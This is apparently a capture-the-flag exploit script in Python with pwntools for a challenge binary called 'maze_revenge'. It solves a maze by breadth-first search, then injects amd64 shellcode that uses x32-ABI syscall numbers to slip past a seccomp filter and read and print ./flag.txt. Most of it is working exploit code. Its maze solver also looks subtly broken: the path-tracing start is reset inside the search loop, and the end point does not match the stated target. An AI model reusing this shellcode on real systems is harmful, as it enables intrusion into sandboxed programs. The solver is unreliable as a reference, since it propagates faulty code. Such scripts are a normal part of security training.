#!/usr/bin/env python
# -*- coding: utf-8 -*-
from collections import *
from pwn import *

context(log_level="debug", arch="amd64", os="linux")
debug = 1
if debug == 1:
    p = process('./maze_revenge')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('192.168.30.50', 20001)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./maze_revenge', checksec=False)

INF = 0x7fffffff


class Point:
    def __init__(self, x=0, y=0):
        self.x = x
        self.y = y


def bfs(maze, begin, end):
    pd = ''
    n, m = len(maze), len(maze[0])
    dist = [[INF for _ in range(m)] for _ in range(n)]
    pre = [[None for _ in range(m)] for _ in range(n)]
    dx = [1, 0, -1, 0]
    dy = [0, 1, 0, -1]
    sx, sy = begin.x, begin.y
    gx, gy = end.x, end.y

    dist[sx][sy] = 0
    queue = deque()
    queue.append(begin)
    while queue:
        curr = queue.popleft()
        find = False
        for i in range(4):
            nx, ny = curr.x + dx[i], curr.y + dy[i]
            if 0 <= nx < n and 0 <= ny < m and maze[nx][ny] != 'x' and dist[nx][ny] == INF:
                dist[nx][ny] = dist[curr.x][curr.y] + 1
                pre[nx][ny] = curr
                queue.append(Point(nx, ny))
                if nx == gx and ny == gy:
                    find = True
                    break
        if find:
            break
        stack = []
        curr = begin
    while True:
        stack.append(curr)
        if curr.x == begin.x and curr.y == begin.y:
            break
        prev = pre[curr.x][curr.y]
        curr = prev

    while stack:
        last = curr
        curr = stack.pop()
        if curr.y == last.y + 1:
            pd += 'd'
        elif curr.x == last.x + 1:
            pd += 's'
        elif curr.y == last.y - 1:
            pd += 'a'
        elif curr.x == last.x - 1:
            pd += 'w'
    if curr.y == last.y + 1:
        pd += 'd'
    elif curr.x == last.x + 1:
        pd += 's'
    elif curr.y == last.y - 1:
        pd += 'a'
    elif curr.x == last.x - 1:
        pd += 'w'
    return pd


p.recvuntil('maze size:44, start(2,1), end(41,42)\n')
maze = [['' for _ in range(44)] for _ in range(44)]
begin = Point()
end = Point()
for i in range(44):
    s = p.recvuntil('\n')[: -1]
    maze[i] = list(s)
    begin.x = 2
    begin.y = 1
    end.x = 40
    end.y = 42
pd = bfs(maze, begin, end)
p.sendlineafter('input your steps', pd)
sc_open = asm('''
              push 0x7478;
              mov rax, 0x742e67616c662f2e;
              push rax;
              mov rdi, rsp;
              mov rax, 0x40000002;
              xor rsi, rsi;
              xor rdx, rdx;
              xor r10, r10;
              xor r8, r8;
              xor r9, r9;
              syscall;
              ''')
# 需要设置read的fd为rax，open运行之后会返回 打开的文件的fd到rax
sc_read = asm('''
              mov rsi, rdi;
              mov rdi, rax;
              mov rax, 0x40000000;
              mov rdx, 0x30;
              xor r10, r10;
              xor r8, r8;
              xor r9, r9;
              syscall;
              ''')
sc_write = asm('''
               mov rax, 0x40000001;
               mov rdi, 1;
               mov rdx, 0x30;
               xor r10, r10;
               xor r8, r8;
               xor r9, r9;
               syscall;
               ''')
sc_exit = asm('''
              mov rax, 0x4000003c
              xor rdi, rdi
              syscall
              ''')
pd = sc_open + sc_read + sc_write + sc_exit
p.sendlineafter("6. quit\n> ", '1')
# gdb.attach(p, "b *0x400EF0\nc")
# gdb.attach(p, "b *0x400f7f\nc")
p.sendafter('so show me the code \n', pd)
p.recvuntil('seccomp init success\n')
flag = p.recvuntil('}')
print flag
p.recv()
p.interactive()
